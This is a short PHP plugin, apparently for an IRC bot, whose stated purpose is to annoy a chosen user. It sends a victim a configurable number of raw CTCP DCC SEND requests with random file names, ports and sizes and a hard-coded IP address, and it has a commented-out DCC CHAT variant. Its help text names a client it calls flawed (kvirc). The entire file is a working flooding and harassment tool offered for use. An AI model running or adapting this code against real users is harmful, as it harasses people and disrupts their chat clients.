<?php
$lang = array(
	'en' => array(
		'help' => 'Usage: %CMD% <victim> [<amt=10>]. Try to send masses of DCC SEND file requests to annoy a particular user.',
		'good' => 'Protected Clients: nettalk',
		'bad' => 'Flawed Clients: kvirc',
	),
);
$plugin = Dog::getPlugin();
$argv = $plugin->argv();
$argc = count($argv);

if ($argc === 1)
{
	$amt = 10;
}
elseif ($argc === 2)
{
	if (0 >= ($amt = (int)$argv[1]))
	{
		return $plugin->showHelp();
	}
}
else
{
	return $plugin->showHelp();
}

$user = Dog::getUserByArg($argv[0]);

$server = Dog::getServer();
$one = chr(1);
$ip = ip2long('92.77.135.158');
for ($i = 0; $i < $amt; $i++)
{
	$filename = GWF_Random::randomKey(16).'.txt';
	$port = rand(10000, 50000);
	$filesize = rand(20000, 80000);
	$payload = "PRIVMSG {$user->getName()} :{$one}DCC SEND {$filename} $ip $port $filesize{$one}";
// 	$payload = "PRIVMSG {$user->getName()} :{$one}DCC CHAT $ip $port{$one}";
	$server->sendRAW($payload);
}
